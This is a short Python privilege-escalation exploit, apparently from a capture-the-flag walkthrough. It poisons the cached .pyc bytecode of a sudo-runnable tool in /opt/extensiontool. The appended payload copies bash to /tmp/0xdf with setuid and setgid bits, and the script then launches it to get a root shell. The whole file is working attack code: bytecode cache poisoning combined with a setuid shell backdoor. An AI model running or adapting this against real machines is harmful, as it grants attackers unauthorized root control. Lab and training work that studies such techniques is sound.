import marshal
import subprocess
from pathlib import Path


BASE_DIR = Path("/opt/extensiontool")

print('[*] Running extension_tool.py to ensure .pyc files exist')
subprocess.run(['sudo', BASE_DIR / 'extension_tool.py'], capture_output=True)

print('[*] Reading legit header from .pyc')
pyc = BASE_DIR / '__pycache__/extension_utils.cpython-312.pyc'
raw_header = pyc.read_bytes()[:16]

print('[*] Creating poisoned source code')
orig = BASE_DIR / 'extension_utils.py'
orig_src = orig.read_text()
poisoned_src = orig_src + '''

import os
os.system('cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf')
'''

print('[*] Compiling poisoned source and overwriting .pyc')
code = compile(poisoned_src, BASE_DIR / 'extension_utils.py', 'exec')
pyc.unlink()
pyc.write_bytes(raw_header + marshal.dumps(code))

print('[*] Running extension_tool.py with poisoned .pyc')
subprocess.run(['sudo', BASE_DIR / 'extension_tool.py'], capture_output=True)

shell = Path('/tmp/0xdf')
if shell.exists():
    print('[+] SetUID / SetGID bash exists. Starting root shell.')
    subprocess.run(['/tmp/0xdf', '-p'])
else:
    print('[-] Exploit failed')

